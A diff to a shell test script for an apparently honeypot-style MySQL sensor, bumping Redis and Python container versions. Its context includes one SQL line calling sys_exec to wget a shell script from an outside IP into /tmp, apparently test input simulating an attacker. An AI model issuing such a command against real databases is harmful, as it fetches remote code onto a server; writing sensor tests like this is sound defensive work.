@@ -15,7 +15,7 @@ cleanup() {
 trap cleanup EXIT; cleanup
 docker build -q -f sensors/mysql/Dockerfile -t "$IMG" . >/dev/null
 docker network create "$NET" >/dev/null
-docker run -d --name "$REDIS" --network "$NET" redis:7.4-alpine >/dev/null
+docker run -d --name "$REDIS" --network "$NET" redis:8.10-alpine >/dev/null
 docker run -d --name "$NAME" --network "$NET" --read-only --tmpfs /tmp --cap-drop ALL \
   --security-opt no-new-privileges:true --memory 256m --memory-swap 256m --cpus 0.5 --pids-limit 128 \
   -v "$NAME-data:/data" -e REDIS_HOST="$REDIS" -e EVENTS_STREAM=events:mysql "$IMG" >/dev/null
@@ -56,7 +56,7 @@ select sys_exec('wget http://198.51.100.9/x.sh -O /tmp/x.sh');
 SQL
 
 echo "--- PyMySQL"
-docker run --rm --network "$NET" python:3.13-slim-bookworm sh -c "pip install -q pymysql cryptography >/dev/null 2>&1; python - <<PY
+docker run --rm --network "$NET" python:3.15-slim-trixie sh -c "pip install -q pymysql cryptography >/dev/null 2>&1; python - <<PY
 import pymysql
 c = pymysql.connect(host='$NAME', user='root', password='', ssl_disabled=True)
 cur = c.cursor(); cur.execute('select @@version'); print(cur.fetchone())
